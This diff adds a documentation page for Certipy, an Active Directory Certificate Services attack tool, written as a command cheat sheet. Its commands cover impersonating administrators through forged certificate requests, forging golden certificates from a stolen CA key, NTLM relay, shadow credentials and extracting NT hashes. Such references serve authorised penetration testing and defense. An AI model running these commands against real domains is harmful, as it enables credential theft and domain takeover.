@@ -1,0 +1,348 @@
+---
+title: "Certipy"
+---
+
+Certipy is the primary Linux tool for AD CS enumeration and exploitation: it finds vulnerable certificate templates (ESC1–ESC16), requests and forges certificates, authenticates via PKINIT/Schannel, and manages shadow credentials and CA configuration.
+
+```bash wrap
+pip install certipy-ad
+# or
+pipx install certipy-ad
+```
+
+See [ADCS](/active-directory/adcs) for the full ESC1–ESC16 attack chains.
+
+## Common Variables
+
+All commands below assume these environment variables are set:
+
+```bash wrap
+export USER=jsmith
+export DOMAIN=corp.local
+export PASSWORD='Passw0rd!'
+export DC_IP=10.0.0.100
+export CA_HOST=ca.corp.local
+export CA='CORP-CA'
+export TEMPLATE=VulnTemplate
+```
+
+## Global Auth Flags
+
+Every subcommand accepts these; omitted from individual examples for brevity.
+
+| Flag | Description |
+|---|---|
+| `-u $USER@$DOMAIN -p $PASSWORD` | Username + password |
+| `-hashes :$NTHASH` | Pass-the-hash |
+| `-k -no-pass` | Kerberos (KRB5CCNAME must be set) |
+| `-aes $AES_KEY` | AES key for Kerberos |
+| `-dc-ip $DC_IP` | Domain controller IP |
+| `-dc-host $DC_HOST` | DC hostname (use with Kerberos) |
+| `-ns $DC_IP` | Nameserver for DNS resolution |
+| `-debug` | Verbose output |
+
+## find — Enumerate and Discover Vulnerabilities
+
+Enumerate all CA and template configurations and check for ESC conditions.
+
+```bash wrap
+# Quick: print only vulnerable findings to stdout
+certipy find -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -vulnerable -stdout
+
+# Full: write JSON + text files (prefix = output)
+certipy find -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP
+
+# Kerberos
+certipy find -u $USER@$DOMAIN -k -no-pass \
+  -dc-ip $DC_IP -vulnerable -stdout
+
+# Filters
+certipy find ... -enabled            # only enabled templates
+certipy find ... -vulnerable         # only vulnerable templates
+certipy find ... -hide-admins        # suppress entries only exploitable by admins
+certipy find ... -oids               # show Issuance Policy OIDs (needed for ESC13)
+certipy find ... -dc-only            # collect via LDAP only (no RPC to CA)
+certipy find ... -output prefix      # save to prefix.json / prefix.txt
+certipy find ... -text/-json/-csv    # force specific output format
+```
+
+## req — Request Certificates
+
+```bash wrap
+# Basic request (uses User template by default)
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template $TEMPLATE
+
+# ESC1: supply UPN in SAN to impersonate another user
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template $TEMPLATE \
+  -upn administrator@$DOMAIN \
+  -sid S-1-5-21-...-500           # include SID for patched DCs (KB5014754)
+
+# ESC2/ESC3: request on behalf of another user (enrollment agent)
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template User \
+  -on-behalf-of $DOMAIN\\administrator \
+  -pfx agent.pfx
+
+# ESC7 step 5: retrieve an already-issued/approved request by ID
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -retrieve $REQUEST_ID
+
+# ESC15: inject application policy OID into a v1 template
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template $TEMPLATE \
+  --application-policies "1.3.6.1.4.1.311.20.2.1"
+
+# Alternative enrollment methods (when RPC is blocked)
+certipy req ... -web              # HTTP (certsrv)
+certipy req ... -dcom             # DCOM
+certipy req ... -dynamic-endpoint # RPC over dynamic endpoint
+
+# Other useful flags
+certipy req ... -dns $HOSTNAME    # request with DNS SAN
+certipy req ... -subject "CN=User,DC=corp,DC=local"
+certipy req ... -out custom_name  # override output filename
+```
+
+## auth — Authenticate with a Certificate
+
+Authenticate using a PFX to obtain either an NT hash (PKINIT) or a TGT. Falls back to LDAP shell via Schannel when PKINIT is unavailable.
+
+```bash wrap
+# PKINIT: get NT hash
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+
+# Get TGT only (no hash extraction)
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP -no-hash
+
+# Save TGT as .kirbi
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP -kirbi
+
+# LDAP shell via Schannel (when no PKINIT/smart card EKU)
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP -ldap-shell
+
+# Specify domain when cert CN doesn't match (e.g. after UPN swap ESC9/ESC10)
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP -domain $DOMAIN
+
+# PFX with a password
+certipy auth -pfx administrator.pfx -pfx-password 'pfxpass' -dc-ip $DC_IP
+```
+
+<Tip>
+The LDAP shell (`-ldap-shell`) supports common operations: `add_user_to_group`, `set_rbcd`, `get_laps_password`, `change_password`, `set_dontreqpreauth`. Type `help` once connected.
+</Tip>
+
+## ca — Manage the Certificate Authority
+
+Requires `ManageCA` or `ManageCertificates` rights. Used primarily in ESC7 and ESC5.
+
+```bash wrap
+# List enabled templates on the CA
+certipy ca -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST -ca $CA \
+  -list-templates
+
+# Enable / disable a template
+certipy ca ... -enable-template SubCA
+certipy ca ... -disable-template SubCA
+
+# Issue a pending or denied request (ESC7 step 4)
+certipy ca ... -issue-request $REQUEST_ID
+
+# Deny a request
+certipy ca ... -deny-request $REQUEST_ID
+
+# Grant yourself Certificate Officer role (ESC7 step 2)
+certipy ca ... -add-officer $USER
+certipy ca ... -remove-officer $USER
+
+# Back up the CA private key and cert (ESC12 — needs admin on CA)
+certipy ca -u $USER@$DOMAIN -p $PASSWORD \
+  -target $CA_HOST -ca $CA -backup
+```
+
+## template — View and Modify Templates
+
+```bash wrap
+# Save current template config to JSON (auto-backup before writing)
+certipy template -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -template $TEMPLATE \
+  -save-configuration $TEMPLATE.json
+
+# Overwrite template with default ESC1-vulnerable settings (ESC4)
+certipy template -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -template $TEMPLATE \
+  -write-default-configuration
+
+# Restore template from saved JSON
+certipy template -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -template $TEMPLATE \
+  -write-configuration $TEMPLATE.json
+
+# Skip confirmation prompts
+certipy template ... -force
+```
+
+## forge — Create Golden Certificates
+
+Requires the CA private key (obtained via ESC12 backup or physical access to CA).
+
+```bash wrap
+# Forge a cert for any user
+certipy forge -ca-pfx $CA.pfx \
+  -upn administrator@$DOMAIN \
+  -sid S-1-5-21-...-500
+
+# With CRL distribution point (required to avoid KDC_ERROR_CLIENT_NOT_TRUSTED)
+certipy forge -ca-pfx $CA.pfx \
+  -upn administrator@$DOMAIN \
+  -sid S-1-5-21-...-500 \
+  -crl 'ldap:///'
+
+# Clone properties from a legitimate cert
+certipy forge -ca-pfx $CA.pfx \
+  -template legitimate.pfx \
+  -upn administrator@$DOMAIN \
+  -sid S-1-5-21-...-500
+
+# Forge for a computer account (DNS SAN)
+certipy forge -ca-pfx $CA.pfx \
+  -dns dc.corp.local \
+  -sid S-1-5-21-...-1000
+
+# Control output
+certipy forge ... -out admin_forged.pfx -pfx-password 'abc'
+certipy forge ... -key-size 4096 -validity-period 365
+```
+
+## relay — NTLM Relay to AD CS
+
+Relay incoming NTLM authentication to the certsrv HTTP endpoint. Run while coercing a target machine's authentication.
+
+```bash wrap
+# Relay to certsrv HTTP and request a DomainController cert
+certipy relay -target http://$CA_HOST -template DomainController
+
+# Relay with specific CA
+certipy relay -target http://$CA_HOST/certsrv/certfnsh.asp \
+  -ca $CA -template DomainController
+
+# Relay and request a User cert instead (for ESC8 against workstations)
+certipy relay -target http://$CA_HOST -template User
+
+# Keep relay server alive for multiple captures
+certipy relay -target http://$CA_HOST -template DomainController -forever
+
+# Retrieve an already-issued cert by request ID (if relay caught the auth but cert wasn't saved)
+certipy relay -target http://$CA_HOST -retrieve $REQUEST_ID
+
+# Enumerate templates the relayed user can enrol in
+certipy relay -target http://$CA_HOST -enum-templates
+
+# Bind to a specific interface
+certipy relay -target http://$CA_HOST -template DomainController \
+  -interface $LHOST -port 445
+```
+
+## shadow — Shadow Credentials (msDS-KeyCredentialLink)
+
+Add a Key Credential Link to a target account and authenticate via PKINIT. Requires `WriteProperty` on `msDS-KeyCredentialLink`.
+
+```bash wrap
+# Auto: add credential, authenticate, print hash, then remove — all in one shot
+certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -account $TARGET
+
+# Add a persistent shadow credential
+certipy shadow add -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -account $TARGET
+
+# List existing Key Credential Links on an account
+certipy shadow list -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -account $TARGET
+
+# Remove a specific Key Credential Link by device GUID
+certipy shadow remove -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -account $TARGET \
+  -device-id f4474290-e5a0-ea54-3858-82e68421a13d
+
+# Remove all Key Credential Links from an account
+certipy shadow clear -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -account $TARGET
+
+# Authenticate using a shadow credential PFX (then extract NT hash)
+certipy auth -pfx $TARGET.pfx -dc-ip $DC_IP
+```
+
+## account — Manage AD Accounts
+
+Create, read, update, and delete user/computer accounts. Used in ESC9/ESC10/ESC14 to modify UPN or `altSecurityIdentities`.
+
+```bash wrap
+# Read an account's attributes (useful to grab SID before requesting a cert)
+certipy account read -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -user $TARGET
+
+# Update UPN (ESC9/ESC10/ESC16: point to the account you want to impersonate)
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -user $TARGET -upn administrator@$DOMAIN
+
+# Restore the original UPN after cert is obtained
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -user $TARGET -upn $TARGET@$DOMAIN
+
+# Set SAMAccountName (used in noPac / CVE-2021-42278)
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -user $TARGET -sam dc$
+
+# Create a machine account
+certipy account create -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -user 'attacker$' -pass $COMP_PASS \
+  -dns attacker.corp.local
+
+# Delete an account
+certipy account delete -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -user 'attacker$'
+```
+
+## cert — Manipulate Certificates Locally
+
+Inspect, convert, and extract PFX files without connecting to a CA.
+
+```bash wrap
+# Export cert + key to PFX
+certipy cert -pfx input.pfx -export -out output.pfx
+
+# Export with password protection
+certipy cert -pfx input.pfx -export -out protected.pfx -export-password 'abc'
+
+# Export only the certificate (no key)
+certipy cert -pfx input.pfx -nokey -out cert.crt
+
+# Export only the private key (no cert)
+certipy cert -pfx input.pfx -nocert -out key.pem
+
+# Combine a separate key + cert into a PFX
+certipy cert -key key.pem -cert cert.crt -export -out combined.pfx
+```
+
+## parse — Offline Analysis
+
+Analyse AD CS registry exports from BOF tools (Certipy BOF, Certify) without network access.
+
+```bash wrap
+# Parse a BOF/registry export file
+certipy parse -format bof registry_export.txt -domain corp.local -ca $CA
+
+# Show only vulnerable findings
+certipy parse -format bof registry_export.txt \
+  -domain corp.local -ca $CA -vulnerable
+```
